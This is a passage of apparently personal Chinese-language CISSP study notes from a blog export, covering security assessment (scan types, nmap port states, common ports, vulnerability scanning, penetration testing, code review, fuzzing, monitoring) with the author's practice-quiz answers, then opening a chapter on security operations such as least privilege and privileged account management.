扫描</h4><p>向远程系统的某个端口创建全连接。</p><p>适用于执行扫描的用户没有运行半开放扫描所需权限的情况。</p><h4 id="TCP-ACK-扫描"><a href="#TCP-ACK-扫描" class="headerlink" title="TCP ACK 扫描"></a>TCP ACK 扫描</h4><p>发送设置 ACK  标志位的数据包，表明属于某个开放连接。</p><p>适用于尝试确定防火墙规则或防火墙方法。</p><h4 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h4><p>使用 UDP协议对远程系统开展扫描以检查存储的 UDP 服务。</p><p>不使用三次握手，UDP 是无连接协议。</p><h4 id="Xmas-扫描"><a href="#Xmas-扫描" class="headerlink" title="Xmas 扫描"></a>Xmas 扫描</h4><p>发送设置 FIN、PSH 及 URG 标志位的数据包</p><h4 id="nmap扫描工具"><a href="#nmap扫描工具" class="headerlink" title="nmap扫描工具"></a>nmap扫描工具</h4><p>nmap 扫描工具端口状态</p><p><strong>Open（开放）</strong>：该端口已经开放，意味着端口上运行着可以主动接受连接请求的应用程序</p><p><strong>Closed（关闭）</strong>：该端口可以访问，防火墙允许访问该端口，但是该端口上没有运行接受连接请求的程序</p><p><strong>Filtered（过滤）</strong>：防火墙干扰连接尝试，无法确定端口是否开放还是关闭。</p><h3 id="2-网络漏洞扫描"><a href="#2-网络漏洞扫描" class="headerlink" title="2. 网络漏洞扫描"></a>2. 网络漏洞扫描</h3><p>网络漏洞扫描不仅探测开放端口，还会继续探测目标系统或网络，从而确定是否存在已知漏洞。</p><p>误报（false positive report）：系统不存在漏洞，但是扫描器报告存在漏洞。</p><p>漏报（false negative report）：系统存在漏洞，但是扫描报告不存在漏洞，此类更加危险。</p><p>网络扫描器默认执行未经身份认证的扫描，也限制网络扫描器发现问题的能力。</p><p>实施经过身份认证的系统扫描是一种有效的方法，可以提高扫描的准确性，减少误报和漏报。</p><p>网络扫描器之拥有待测系统的只读权限。</p><h4 id="常见-TCP-端口"><a href="#常见-TCP-端口" class="headerlink" title="常见 TCP 端口"></a>常见 TCP 端口</h4><p>FTP：21&#x2F;20</p><p>SSH：22</p><p>Telnet：23</p><p>SMTP：25</p><p>DNS：53</p><p>HTTP：80</p><p>POP3: 110</p><p>NTP ：123</p><p>Windows File Sharing ：135、137-139、445</p><p>HTTPS：443</p><p>LPR&#x2F;LPD：515</p><p>Microsoft SQL Server：1433&#x2F;1434</p><p>Oracle：1521</p><p>H.323：1720</p><p>PPTP：1723</p><p>RDP：3389</p><p>HP JetDirect printing：9100</p><p>OWASP（Open Web Application Security Project，开放式 Web 应用程序安全项目）</p><h4 id="无限漏洞测试"><a href="#无限漏洞测试" class="headerlink" title="无限漏洞测试"></a>无限漏洞测试</h4><p>aircrack-ng 是一种无限网络安全评估工具，测试无限网络的加密算法和其他安全参数进行评估。</p><p>aircrack-ng 可以与被动监测技术协同工作，识别网络中的流氓设备。</p><h3 id="3-Web-应用程序漏洞扫描"><a href="#3-Web-应用程序漏洞扫描" class="headerlink" title="3. Web 应用程序漏洞扫描"></a>3. Web 应用程序漏洞扫描</h3><p>Web 漏洞扫描器是专门检测 Web 应用程序中已知漏洞的工具。</p><p>自动化技术来探测，通过操作输入和其他参数来识别 Web 漏洞。</p><p>扫描器提供扫描结果报告和修复建议。</p><p>Web 扫描器只扫描 Web 应用程序。</p><p>网络漏洞扫描器不会深入 Web 应用程序内部结构。</p><p>Web 应用程序漏洞扫描适用场景</p><ul><li>在初次执行 Web  应用程序漏洞扫描时扫描所有应用程序，可以检测到遗留应用程序的问题。</li><li>在初次将任意的新应用程序移植到生产环境前执行 扫描</li><li>在将代码变更部署到生产环境前扫描所有修改过的应用程序</li><li>定期扫描所有应用程序，根据应用程序优先级安排扫描任务。敏感数据交程序频繁扫描。</li></ul><p>支付卡行业数据安全标准（Payment Card Industry Data Security Standard，PCI DSS）要求企业至少每年执行一次 Web 应用程序漏洞扫描，或安装专业的 Web 应用程序防火墙。</p><h3 id="4-数据库漏洞扫描"><a href="#4-数据库漏洞扫描" class="headerlink" title="4. 数据库漏洞扫描"></a>4. 数据库漏洞扫描</h3><p>大多数数据库受到防火墙保护，但是 Web 应用程序会提供访问数据的入口，存在利用应用程序攻击数据库的风险。</p><p>sqlmap 是一种常用的开源数据库漏洞扫描工具，检测 Web 应用程序的数据库漏洞。</p><h3 id="5-漏洞管理工作流程"><a href="#5-漏洞管理工作流程" class="headerlink" title="5. 漏洞管理工作流程"></a>5. 漏洞管理工作流程</h3><p>组织采用漏洞管理系统，应该形成一套工作流程来管理漏洞。</p><p>工作流程步骤</p><p>（1）检测：漏洞的初次识别通常是漏洞扫的结果。</p><p>（2）验证：一旦扫描器检测到漏洞，管理员应该验证漏洞，判断是否为误报</p><p>（3）修复：应该对验证过的漏洞加以修复</p><p>修复方式可能为：采用供应商提供的补丁，修改设备配置，执行规避漏洞的折中方法，安全防火墙以及其他措施</p><p>工作流程目的：</p><p>确保组织能够有条不紊地检测和修复漏洞。</p><h2 id="15-2-3-渗透测试"><a href="#15-2-3-渗透测试" class="headerlink" title="15.2.3 渗透测试"></a>15.2.3 渗透测试</h2><p>渗透测试实际上是在尝试攻击系统，所有渗透测试会比漏洞测试方法更深入。</p><p>漏洞扫描仅探测漏洞的存在，不会进行攻击性行为。</p><p>渗透测试会尝试突破安全控制措施，入侵目标，验证漏洞的存在。</p><p>渗透测试需要关注的范围比漏洞扫描更广。</p><h3 id="渗透测试阶段"><a href="#渗透测试阶段" class="headerlink" title="渗透测试阶段"></a>渗透测试阶段</h3><ul><li><p>规划阶段</p><p>测试范围和参与规则需要达成一致，明确测试是经过授权的。</p></li><li><p>信息收集和发现阶段</p><p>人工+自动化工具收集目标环境信息。</p><p>侦察系统功能，发现系统开放端口</p></li><li><p>攻击阶段</p><p>尝试使用手动和自动漏洞利用工具来破坏系统安全</p></li><li><p>报告阶段</p><p>总结渗透测试结果，并提出改进系统安全的建议</p></li></ul><p><img src="/2024/12/24/informationCocoon/tk_group_message/-%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E6%B5%8B%E8%AF%95/image-20250609092536477.png" alt="image-20250609092536477"></p><p>常见自动化漏洞利用渗透工具：Metasploit</p><p>渗透测试人员可以是内部，也可以是公司聘请的外部顾问。</p><h3 id="渗透测试类型"><a href="#渗透测试类型" class="headerlink" title="渗透测试类型"></a>渗透测试类型</h3><h4 id="白盒渗透测试（White-Box-Penetration-Test）"><a href="#白盒渗透测试（White-Box-Penetration-Test）" class="headerlink" title="白盒渗透测试（White-Box Penetration Test）"></a>白盒渗透测试（White-Box Penetration Test）</h4><p>向攻击者提供详细的目标系统信息。</p><p>绕过侦察步骤，缩短攻击时间，提升漏洞发现可能性。</p><h4 id="灰盒渗透测试（Gray-Box-Penetration-Test）"><a href="#灰盒渗透测试（Gray-Box-Penetration-Test）" class="headerlink" title="灰盒渗透测试（Gray-Box Penetration Test）"></a>灰盒渗透测试（Gray-Box Penetration Test）</h4><p>部分知识测试，用于平衡白盒和黑盒渗透测试的优缺点。</p><p>当需要黑盒测试结果时，但是由于时间或成本原因，需要一些知识来完成测试时，使用这种方式。</p><h4 id="黑盒渗透测试（Black-Box-Penetration-Test）"><a href="#黑盒渗透测试（Black-Box-Penetration-Test）" class="headerlink" title="黑盒渗透测试（Black-Box Penetration Test）"></a>黑盒渗透测试（Black-Box Penetration Test）</h4><p>攻击之前不会向测试人员透露任何信息。</p><p>测试启动前，需要明确指出参与规则，从高级管理层获得充分授权。</p><h3 id="入侵模拟攻击BAS"><a href="#入侵模拟攻击BAS" class="headerlink" title="入侵模拟攻击BAS"></a>入侵模拟攻击BAS</h3><p>入侵模拟攻击（BAS）平台寻求自动化渗透测试的某些方面。</p><p>目的在于将威胁指标注入网络和系统，以触发其他安全控制。</p><p>运行良好的安全方案中，检测和预防措施可以立即检测和&#x2F;或阻止潜在的恶意流量。</p><h2 id="15-2-4-合规性检查"><a href="#15-2-4-合规性检查" class="headerlink" title="15.2.4 合规性检查"></a>15.2.4 合规性检查</h2><p>组织创建并维护合规计划，记录每项监管义务，并将其映射到满足目标的明确的安全控制措施。</p><p>合规性检查验证合规计划列出的所有控制措施是否正常运行并有效满足监管要求。</p><p>定期执行合规检查，确保组织合规计划的正常运转。</p><h1 id="15-3-测试软件"><a href="#15-3-测试软件" class="headerlink" title="15.3 测试软件"></a>15.3 测试软件</h1><p>应用程序包含特征</p><ul><li><p>软件应用程序通常拥有操作系统、硬件和其他资源的访问特权。</p></li><li><p>软件应用程序往往处理敏感信息。</p></li><li><p>许多软件应用程序依赖于存储敏感信息的数据库。</p></li><li><p>软件应用程序是现代企业和核心，执行关键业务功能。</p><p>软件故障可能对业务造成严重破坏。</p></li></ul><p>软件核心设计原则是软件永远不要依赖用户的正确操作，需要预料意外情况，并从容地处理无效输入、不正确排序的活动以及其他意外情况。也就是异常处理。</p><h2 id="15-3-1-代码审查与测试"><a href="#15-3-1-代码审查与测试" class="headerlink" title="15.3.1 代码审查与测试"></a>15.3.1 代码审查与测试</h2><p>代码审查与测试是软件测试方案最关键的组成部分。</p><h3 id="1-代码审查-code-review"><a href="#1-代码审查-code-review" class="headerlink" title="1. 代码审查 code review"></a>1. 代码审查 code review</h3><p>代码审查（code review）是软件评估的基础。</p><p>代码审查也被称为“同行评审”（peer review），也就是其他开发人员对代码进行审查。</p><h4 id="代码审查过程-范根检查法（Fagan-inspection）"><a href="#代码审查过程-范根检查法（Fagan-inspection）" class="headerlink" title="代码审查过程-范根检查法（Fagan inspection）"></a>代码审查过程-范根检查法（Fagan inspection）</h4><p>包含六个步骤</p><ul><li>规划</li><li>总览</li><li>准备</li><li>审查</li><li>反工</li><li>追踪</li></ul><p>范根检查已经规定好每个阶段进入和退出的标准。</p><p>必须先满足标准，才可以进入流程的下一阶段。</p><p>范根检查级别的审查只出现在严格受限的研发环境，也就是代码缺陷会造成灾难性危害。</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/-%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E6%B5%8B%E8%AF%95/image-20250609113509299.png" alt="image-20250609113509299"></p><h4 id="代码审查方法-同行评审方法"><a href="#代码审查方法-同行评审方法" class="headerlink" title="代码审查方法-同行评审方法"></a>代码审查方法-同行评审方法</h4><p>大多数组织采用稍微宽松的代码审查流程</p><ul><li>开发人员在会议上与一个或多个其他团队成员走查（walk through）代码</li><li>高级开发人员执行手动代码审查，在将代码移植到生产环境之前签署所有代码</li><li>在将代码移植到生产环境之前使用自动化代码审查工具检测常见的缺陷</li></ul><h3 id="2-静态测试-SAST"><a href="#2-静态测试-SAST" class="headerlink" title="2. 静态测试 SAST"></a>2. 静态测试 SAST</h3><p>静态应用程序安全测试（SAST）在不运行软件的情况下，通过分析<strong>源代码</strong>或<strong>编译后的应用程序</strong>来评估软件的安全性。</p><p>自动化检测工具，检测常见的软件缺陷：缓冲区溢出</p><p>静态分析工具运用于软件设计、构建及测试过程。</p><h3 id="3-动态测试-DAST"><a href="#3-动态测试-DAST" class="headerlink" title="3. 动态测试 DAST"></a>3. 动态测试 DAST</h3><p>动态应用程序安全测试（DAST）在软件运行环境下检测软件的安全性。</p><p>如果无法接触到软件底层代码，也就是部署他人开发的软件，动态应用程序安全测试是唯一的选择。</p><p>常见动态测试示例：Web 应用程序漏洞扫描。</p><p>生产环境中，动态测试务必小心开展，以避免服务的意外中断。</p><p>动态测试可以使用模拟事务（synthetic transaction）</p><p>模拟事务：</p><p>一些脚本化的事务用户以及预期结果，关注实际结果是否和预期结果一致。</p><p><strong>IAST</strong></p><p>交互式安全测试对运行时行为、应用程序性能、流量、框架、组件进行实时分析</p><p><strong>RASP</strong></p><p>运行时应用程序自我保护是一种在服务区上运行的工具，可以拦截应用程序的调用，并验证数据请求。</p><p><strong>道德披露</strong></p><p>漏洞私下告知供应商，让供应商在公布之前修复漏洞。</p><h3 id="4-模糊测试"><a href="#4-模糊测试" class="headerlink" title="4. 模糊测试"></a>4. 模糊测试</h3><p>模糊测试是一种特殊的动态测试技术，向软件提供许多不同类型的输入来测试其边界，以发现之前未检测到的缺陷。</p><h4 id="突变（mutation-或-dumb）模糊测试"><a href="#突变（mutation-或-dumb）模糊测试" class="headerlink" title="突变（mutation 或 dumb）模糊测试"></a>突变（mutation 或 dumb）模糊测试</h4><p>从软件实际操作获取输入值，然后操纵或改变输入值来生产模糊输入。</p><h4 id="预生成（智能）模糊测试"><a href="#预生成（智能）模糊测试" class="headerlink" title="预生成（智能）模糊测试"></a>预生成（智能）模糊测试</h4><p>设计数据模型，并基于对软件所用数据类型的理解创新的模糊输入。</p><p>模糊测试不能完全覆盖程序的代码，一般仅限于检测不涉及复杂业务逻辑的简单漏洞。</p><p>模糊测试有助于执行测试覆盖率分析，进而确定测试范围是否完整。</p><h2 id="15-3-2-接口测试"><a href="#15-3-2-接口测试" class="headerlink" title="15.3.2 接口测试"></a>15.3.2 接口测试</h2><p>接口测试依据接口设计规范评估模块的性能，以确保模块在开发工作完后可以协同工作。</p><p>需要测试的接口有三种：</p><p><strong>应用编程接口（API）</strong>：为代码模块之间的交互提供统一的方法，并以 Web 服务的形式向外发布。</p><p>确保 API 实施了所有安全要求。</p><p><strong>用户界面（UI）</strong>：包括图形用户界面（GUI）和命令行界面。</p><p>验证用户界面是否正常工作。</p><p><strong>物理接口</strong>：存在于操作机械装置、逻辑控制器或其他物理设备的一些应用程序。</p><p>谨慎测试物理接口，避免物理接口失效，带来一些潜在的危害。</p><h2 id="15-3-3-误用案例测试"><a href="#15-3-3-误用案例测试" class="headerlink" title="15.3.3 误用案例测试"></a>15.3.3 误用案例测试</h2><p>一些应用程序会以清晰的示例展示软件用户可能错误使用该应用程序的方法。</p><p>使用一种被称为误用案例测试或滥用案例测试的过程来评估软件是否存在已知风险相关的漏洞。</p><p>测试人员先列举已知误用案例，手工活自动化攻击的方法利用案例来测试应用程序。</p><h2 id="15-3-4-测试覆盖率分析"><a href="#15-3-4-测试覆盖率分析" class="headerlink" title="15.3.4 测试覆盖率分析"></a>15.3.4 测试覆盖率分析</h2><p>测试不可能覆盖软件的所有部分。</p><p>通常进行测试覆盖率分析，以估计对新软件的测试程度。</p><p>测试覆盖率 &#x3D; 已测用例的数量&#x2F;全部用户的数量</p><h3 id="测试覆盖率五个常见标准"><a href="#测试覆盖率五个常见标准" class="headerlink" title="测试覆盖率五个常见标准"></a>测试覆盖率五个常见标准</h3><ul><li><strong>分支覆盖率</strong>：在所有 if 和 else 条件下，是否已执行每个 if 语句</li><li><strong>条件覆盖率</strong>：在所有输入集合下，是否已经测试代码中的每个逻辑？</li><li><strong>函数覆盖率</strong>：是否已调用代码中的每个函数并返回结果？</li><li><strong>循环覆盖率</strong>：在导致代码执行多次、一次或零次的条件下，是否已执行代码中的每个循环？</li><li>语句覆盖率：测试期间，是否已执行所有代码？</li></ul><h2 id="15-3-5-网络监测"><a href="#15-3-5-网络监测" class="headerlink" title="15.3.5 网络监测"></a>15.3.5 网络监测</h2><p>安全人员也参与网站的持续监控。</p><h3 id="网络检测分为-2-类"><a href="#网络检测分为-2-类" class="headerlink" title="网络检测分为 2 类"></a>网络检测分为 2 类</h3><h4 id="被动监测"><a href="#被动监测" class="headerlink" title="被动监测"></a>被动监测</h4><p>在流量穿越网络或抵达服务器的过程中，捕获和分析发送到网站的实际网络流量。</p><p>被动监测提供真实的监测数据。</p><p>真实用户监控（real user monitoring）是被动监测的一种变体。</p><h4 id="综合监测（或主动监测）"><a href="#综合监测（或主动监测）" class="headerlink" title="综合监测（或主动监测）"></a>综合监测（或主动监测）</h4><p>向网站发起伪造的事务活动，从而评估网站性能。</p><p>可以是简单的请求一个页面计算响应时间，也可以是执行复杂的脚步来确认事务活动的结果。</p><p>被动监测和主动监测相互配合使用。</p><p>被动监测需要用户出现问题起作用，擅长解决用户识别的问题。</p><p>综合监测可能忽略真实用户问题，但是可以在问题发现之前进行检测。</p><h1 id="15-4-实施安全管理流程"><a href="#15-4-实施安全管理流程" class="headerlink" title="15.4 实施安全管理流程"></a>15.4 实施安全管理流程</h1><p>信息安全方案：实施评估和测试 + 各种管理流程。</p><p>管理流程目的是监督信息安全计划是否有效运行。</p><p>管理流程为安全评估提供一个关键的反馈环路</p><p>安全管理审查包括：日志审查、账户管理、备份验证、关键性能和风险指标。</p><p>每项审查都遵循一个标准化流程，审查完成后应该获得管理者确认。</p><h2 id="15-4-1-日志审查"><a href="#15-4-1-日志审查" class="headerlink" title="15.4.1 日志审查"></a>15.4.1 日志审查</h2><p>存储日志数据</p><p>执行自动化及人工日志审查</p><p>安全信息和事件管理（SIEM）工具包，使大量日志审查的常规工作实现自动化。</p><p>SIEM 工具包利用 syslog 功能来获取信息。</p><p>日志系统利用网络时间协议NTP 确保向 SIEM 发送日志记录系统和 SIEM 的时钟是同步的。</p><p>信息安全管理者应该定期进行日志审查，特别是对于敏感功能，确保特权用户不会滥用职权。</p><p><strong>网络流 NetFlow</strong> 日志有助于调查安全事件，提供系统连接和传输数据量的记录。</p><h2 id="15-4-2-账户管理"><a href="#15-4-2-账户管理" class="headerlink" title="15.4.2 账户管理"></a>15.4.2 账户管理</h2><p>账户管理审查确保用户仅仅保留被授予的权限，且为发生未授权的修改。</p><p>执行账户管理审查的一种方式是对所有账户进行全面审查。由于时间的问题，该方法仅仅适用于特权账户。</p><p><strong>账户管理审查通用示例</strong></p><p>（1）管理人员要求<strong>系统管理员</strong>提供特权用户及其特殊权限的列表，管理人员可以检索列表，以避免篡改</p><p>（2）管理人员要求<strong>特权审批机构</strong>提供特权用户及其特殊权限的列表</p><p>（3）特权审批机构提供的列表和系统管理员提供的列表进行比对，确保只有授权用户保留权限。</p><p>流程还包括：</p><ul><li>确认已解雇用户未保留对系统的访问权限</li><li>检查特定账户的书面记录及其任务</li></ul><p>组织如果没有时间执行全部流程，可以改用抽样方式，抽样方式仅在随机情况下才是有效的。</p><p>随机抽取部分账户验证。</p><p>自动执行账户审核流程，身份和访问管理（IAM）供应商可以提供账户审查工作流程，提示管理员开展审查，维护账户文档并提供审计踪迹（audit trail）表明审计的完成。</p><h2 id="15-4-3-灾难恢复和业务连续性"><a href="#15-4-3-灾难恢复和业务连续性" class="headerlink" title="15.4.3 灾难恢复和业务连续性"></a>15.4.3 灾难恢复和业务连续性</h2><p>一致性的备份方案是业务连续性和灾难恢复计划工作的重要组成部分。</p><p>管理人员应该定期检查备份结果，确保流程有效运行并满足组织的数据保护需求。</p><p>一致性备份方案可能包括审查日志、审查哈希值和请求系统或文件的实际恢复。</p><p>对灾难恢复和业务连续性控制措施定期测试。</p><h2 id="15-4-4-培训和意识"><a href="#15-4-4-培训和意识" class="headerlink" title="15.4.4 培训和意识"></a>15.4.4 培训和意识</h2><p>培训和意识目的在于努力使员工了解当前的威胁，向员工提供最佳实践，从而保护系统抵御攻击。</p><p>从职前培训开始。</p><p>根据个人的角色量身定制。</p><p>全年定期开展培训和意识提升工作。</p><p>使用网络钓鱼模拟来评估安全意识方案的有效性。</p><h2 id="15-4-5-关键绩效和风险指标"><a href="#15-4-5-关键绩效和风险指标" class="headerlink" title="15.4.5 关键绩效和风险指标"></a>15.4.5 关键绩效和风险指标</h2><p>安全管理人员应该持续监测关键绩效和风险指标。</p><p>监测具体指标因组织而异，可能包括如下内容：</p><ul><li>遗留漏洞的数量</li><li>修复漏洞的耗时</li><li>漏洞&#x2F;缺陷重现</li><li>被盗用账户的数量</li><li>在代码移植到生产环境前检测到的软件缺陷数量</li><li>重复审计的结果</li><li>尝试访问已知恶意站点的用户</li></ul><p>展示指标的值随时间的变化。定期查看。</p><h1 id="15-5-本章小结"><a href="#15-5-本章小结" class="headerlink" title="15.5 本章小结"></a>15.5 本章小结</h1><h1 id="15-6-考试要点"><a href="#15-6-考试要点" class="headerlink" title="15.6 考试要点"></a>15.6 考试要点</h1><h1 id="15-易错点"><a href="#15-易错点" class="headerlink" title="15 易错点"></a>15 易错点</h1><p>规划安全测试需要考虑的因素</p><p>漏洞扫描器作用</p><p>PCI DSS</p><p>报告类型</p><p>A✅</p><p>D✅</p><p>C✅</p><p>C✅</p><p>A✅</p><p>C✅</p><p>B✅</p><p>B✅</p><p>D✅</p><p>D❌ C</p><p>​TCP SYN 扫描发送一个 SYN 数据包，接收一个 SYN ACK 数据包作为响应。</p><p>D✅</p><p>B❌ C</p><p>​PCI DSS 要求至少每年进行一次扫描并在程序变更后重新进行扫描。</p><p>B✅</p><p>D❌ C</p><p>​突变模糊测试使用位翻转和其他技术来稍微修改程序的先前输入</p><p>A✅</p><p>B✅</p><p>B✅</p><p>B✅</p><p>C❌ B</p><p>​SOC 报告只提供两种类型：I 类和 II 类，两种报告都提供安全控制措施设计适用性的信息。</p><p>​只有 II 类报告额外提供控制措施在较长时间内的运行有效性意见</p><p>B✅</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>16-域2资产安全+域3安全架构与工程+域7安全运营-安全运营管理</title>
    <link href="/2025/04/21/security/seccert/cissp/16-%E5%9F%9F2%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8+%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86/"/>
    <url>/2025/04/21/security/seccert/cissp/16-%E5%9F%9F2%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8+%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p><strong>资源保护</strong>可以确保组织在部署阶段及整个生命周期中安全地配置资源。</p><p><strong>配置管理</strong>可以保障正确地配置系统。</p><p><strong>变更管理流程</strong>可以防止未经授权的更改引发系统中断。</p><p><strong>补丁和漏洞管理控制</strong>可以确保系统不断更新补丁，并预防已知漏洞。</p><h1 id="16-1-应用基本的安全运营概念"><a href="#16-1-应用基本的安全运营概念" class="headerlink" title="16.1 应用基本的安全运营概念"></a>16.1 应用基本的安全运营概念</h1><p>安全运营实践的主要目的是保护资产。</p><p>安全运营实践有助于识别威胁和漏洞，并实施控制措施来降低资产的风险。</p><p>应尽关心（due care）和尽职审查（due diligence）是指采取合理的措施，持续保护组织的资产。</p><p>高管对应尽关心和尽职审查负有直接责任。</p><h2 id="16-1-1-因需可知最小特权"><a href="#16-1-1-因需可知最小特权" class="headerlink" title="16.1.1 因需可知最小特权"></a>16.1.1 因需可知最小特权</h2><h3 id="1-因需可知的访问-need-to-know"><a href="#1-因需可知的访问-need-to-know" class="headerlink" title="1. 因需可知的访问 need to know"></a>1. 因需可知的访问 need to know</h3><p>因需可知原则要求仅授予用户执行工作所需数据或资源的访问权限。</p><p>因需可知原则主要目的是让秘密信息保持秘密状态。</p><p>因需可知通常和安全许可（security clearance）关联。</p><h3 id="2-最小特权原则"><a href="#2-最小特权原则" class="headerlink" title="2. 最小特权原则"></a>2. 最小特权原则</h3><p>最小特权原则规定，主体仅被授予执行工作所需的特权。</p><p>特权既包括访问数据的权限也包括执行系统任务的权利。</p><p>对于数据，特权是指控制写入、创建、更改或删除数据的能力。</p><p>最小特权原则保护数据的完整性和保密性，或者保护其他文件的完整性。</p><p>最小特权原则不仅适用于访问数据，还适用于访问系统。</p><p><strong>违反最小特权原则的情况</strong>：</p><p>将所有用户添加到本地管理员组或授予计算机的 root 权限。</p><p>最小特权原则通常侧重于保护用户特权受到限制，但也适用于应用程序或进程，确保都是最小特权</p><h2 id="16-1-2-职责分离和责任"><a href="#16-1-2-职责分离和责任" class="headerlink" title="16.1.2 职责分离和责任"></a>16.1.2 职责分离和责任</h2><p>职责分离SoD 和责任确保个体无法完全控制关键功能或系统。</p><p>确保没有任何一个人可危及系统或系统安全。</p><p>职责分离策略形成一个制衡系统，其中两个或多个用户验证彼此的行为，并且必须协同完成必要的工作任务。</p><p>职责分离策略有助于减少欺诈行为。</p><p>组织经常把流程分解为多个任务或职责，并将这些职责分配给不同的人来预防欺诈。</p><p>执行职责分离的另一种方式是多个受信任个体分担安全或管理的功能及职能。</p><h2 id="16-1-3-双人控制"><a href="#16-1-3-双人控制" class="headerlink" title="16.1.3 双人控制"></a>16.1.3 双人控制</h2><p>双人控制（two- person control）双人制。</p><p>要求经过两个人批准后才能执行关键任务。</p><p>实现同行评审并减少串通和欺诈的可能性。</p><p>可以讲一些特权活动配置成双人控制。</p><p>知识分割（split knowledge）基本思想是将执行操作所需的信息或特权分配给两个或多个用户。</p><h2 id="16-1-4-岗位轮换"><a href="#16-1-4-岗位轮换" class="headerlink" title="16.1.4 岗位轮换"></a>16.1.4 岗位轮换</h2><p>岗位轮换（职责轮换）是指员工进行岗位轮换或和其他员工进行职责轮换。</p><p>可以实现同行评审、减少欺诈行为并实现交叉培训。</p><p>交叉培训可以减少环境对任何个体的依赖。</p><p>岗位轮换可以充当威慑和检测机制。</p><h2 id="16-1-5-强制休假"><a href="#16-1-5-强制休假" class="headerlink" title="16.1.5 强制休假"></a>16.1.5 强制休假</h2><p>要求员工强制休假一周或两周。</p><p>提供一种同行评审形式，有助于发现欺诈和串通行为。</p><p>强制休假也可以充当威慑和检测机制。</p><h2 id="16-1-6-特权账户管理PAM"><a href="#16-1-6-特权账户管理PAM" class="headerlink" title="16.1.6 特权账户管理PAM"></a>16.1.6 特权账户管理PAM</h2><p>特权账户管理（PAM）解决方案限制特权账户的访问权限，或者检测账户是否使用了提升的特权。</p><p>Microsoft 域中：</p><p>特权账户包括本地管理员账户（完全控制计算机）、域管理员组中的用户（完全控制域内任何计算机）和企业管理员组的用户（完全控制域林中所有域）。</p><p>Linux 中：</p><p>特权账户包括使用 root 账户或通过 sudo 命令授予 root 访问权限的用户。</p><p>微软域（domain）包含限制特权访问的 PAM解决方案。</p><p>微软域基于即时管理原则。用户被分配到特权组，但是没有特权，需要的时候申请使用，授权存在有效期。</p><p>特权账户管理会监控特权账户执行的操作（新建账户、添加新路由、更改防火墙配置以及访问系统日志和审计文件）</p><h3 id="监控特权"><a href="#监控特权" class="headerlink" title="监控特权"></a>监控特权</h3><p>需要和其他基本原则相组合。</p><p>阻止员工滥用特权，并在受信任员工滥用特权时检测到。</p><p>自动化工具可以监控特殊权限的使用情况。</p><h3 id="检测高级持续性威胁（APT）"><a href="#检测高级持续性威胁（APT）" class="headerlink" title="检测高级持续性威胁（APT）"></a>检测高级持续性威胁（APT）</h3><p>通过监控提升特权的使用，还可以检测高级持续性威胁（advanced persistent threat，APT）活动。</p><p>常见特权操作：</p><ul><li>访问和删除日志</li><li>创建并操作账户</li><li>控制通信路径（例如：开启 3389 或关闭主机防火墙）</li><li>运行各种脚本</li><li>创建和安排计划任务</li></ul><h2 id="16-1-7-服务水平协议-SLA"><a href="#16-1-7-服务水平协议-SLA" class="headerlink" title="16.1.7 服务水平协议 SLA"></a>16.1.7 服务水平协议 SLA</h2><p>服务水平协议（service level agreement，SLA）是组织和外部实体之间的协议。</p><p>SLA 规定了绩效预期，并常包括针对未实现预期的惩罚条款。</p><p>谅解备忘录（MOU）：记录两个实体合作达成共同目标的意愿。</p><p>MOU 不够正式，缺乏处罚条款。</p><h1 id="16-2-解决人员安全和安保问题"><a href="#16-2-解决人员安全和安保问题" class="headerlink" title="16.2 解决人员安全和安保问题"></a>16.2 解决人员安全和安保问题</h1><p>人员安全是安全运营的一个基本要素。</p><p>人是无法替代的。</p><h2 id="16-2-1-胁迫-duress"><a href="#16-2-1-胁迫-duress" class="headerlink" title="16.2.1 胁迫 duress"></a>16.2.1 胁迫 duress</h2><p>员工单独工作时，胁迫（duress）系统非常有用。</p><p>简单胁迫系统只有一个发送遇险呼叫的按钮，通知监控人员。</p><p>安全系统通常包括口令，可以使用不同的口令来确定情况是正常的还是存在问题的。</p><h2 id="16-2-2-出差"><a href="#16-2-2-出差" class="headerlink" title="16.2.2 出差"></a>16.2.2 出差</h2><p>电子设备的安全风险</p><ul><li><p><strong>敏感数据</strong></p><p>最好出差设备不存储任何敏感信息。</p><p>如果需要敏感信息，使用强加密手段保护。</p></li><li><p><strong>恶意软件和监控设备</strong></p><p>始终保持对设备的实际控制。</p><p>出差使用临时设备，结束后清除设备数据，重装系统。</p></li><li><p><strong>免费 Wi-Fi</strong></p><p>用户应该使用自己创建的连接互联网的方法</p><p>例如：无线热点设备</p></li><li><p><strong>VPN</strong></p><p>访问虚拟专用网络（VPN）来创建安全连接。</p></li></ul><h2 id="16-2-3-应急管理"><a href="#16-2-3-应急管理" class="headerlink" title="16.2.3 应急管理"></a>16.2.3 应急管理</h2><p>应急管理计划及实践帮助组织在灾难发生后解决人员安全和安保问题。</p><p>不管面临何种灾难，都应该首先考虑人员安全。</p><h2 id="16-2-4-安全培训和意识"><a href="#16-2-4-安全培训和意识" class="headerlink" title="16.2.4 安全培训和意识"></a>16.2.4 安全培训和意识</h2><p>适当的培训和意识计划，有助于确保员工了解胁迫系统、出差最佳实践、应急管理计划以及人员安全的最佳实践。</p><h1 id="16-3-安全配置资源"><a href="#16-3-安全配置资源" class="headerlink" title="16.3 安全配置资源"></a>16.3 安全配置资源</h1><h2 id="16-3-1-信息和资产所有权"><a 